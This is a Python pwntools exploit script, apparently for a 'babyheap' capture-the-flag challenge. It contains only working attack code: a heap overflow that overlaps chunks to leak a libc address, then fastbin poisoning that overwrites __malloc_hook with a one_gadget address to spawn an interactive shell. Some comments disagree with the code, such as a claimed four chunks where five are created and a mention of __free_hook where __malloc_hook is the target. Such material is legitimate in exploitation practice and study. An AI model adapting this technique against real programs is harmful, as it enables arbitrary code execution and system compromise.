from pwn import *

p = process('./babyheap')
context.log_level = 'debug'
libc = ELF('libc.so')
elf = ELF('babyheap')

def create(size) :
    p.sendlineafter('Command: ','1')
    p.sendlineafter('Size: ',str(size))

def context(index_num,size,content) :
    p.sendlineafter('Command: ','2')
    p.sendlineafter('Index: ',str(index_num))
    p.sendlineafter('Size: ',str(size))
    p.sendlineafter('Content: ',content)

def delete(index_num) :
    p.sendlineafter('Command: ','3')
    p.sendlineafter('Index: ',str(index_num))

def put_context(index_num) :
    p.sendlineafter('Command: ','4')
    p.sendlineafter('Index: ',str(index_num))

#create four chunks
create(10)
create(10)
create(10)
create(10)
create(0x90)

#free --> leak out
delete(1)
delete(2)
payload = 'A'*16 + p64(0x0) + p64(0x21) + p64(0x0)*3 + p64(0x21)
payload += '\x80'
#gdb.attach(p)
context(0,len(payload),payload)

#change the small bin's size
payload2 = p64(0x0)*3 + p64(0x21)
context(3,len(payload2),payload2)

create(10)
create(10)

payload2 = p64(0x0)*3 + p64(0xa1)
context(3,len(payload2),payload2)

create(10)
delete(4)
put_context(2)
p.recvuntil('Content: \n')
data = u64(p.recv(6).ljust(8,'\x00'))
log.success('data :' + hex(data))

#leak --> system --> /bin/sh
base_addr = data - 88 - 0x3c4b20
#system_addr = base_addr + libc.symbols['system']
#bin_addr = base_addr + libc.search('/bin/sh').next()
#log.success('system :' + hex(system_addr))
#log.success('/bin/sh :' + hex(bin_addr))

#__free_hook --> system
malloc_addr = base_addr + libc.symbols['__malloc_hook']
target_addr = malloc_addr - 0x23
create(0x90)
create(0x60)
create(0x60)
delete(7)
delete(6)

payload3 = p64(0x0)*3 + p64(0x71) + p64(target_addr)
context(5,len(payload3),payload3)
create(0x60)
create(0x60)

system_addr = base_addr + 0x4526a
payload4 = p64(0x948094de20000000) + p64(0x948094da0000007f) + '\x7f\x00\x00' + p64(system_addr)
context(7,len(payload4),payload4)

#malloc --> system
create(0x60)

p.interactive()
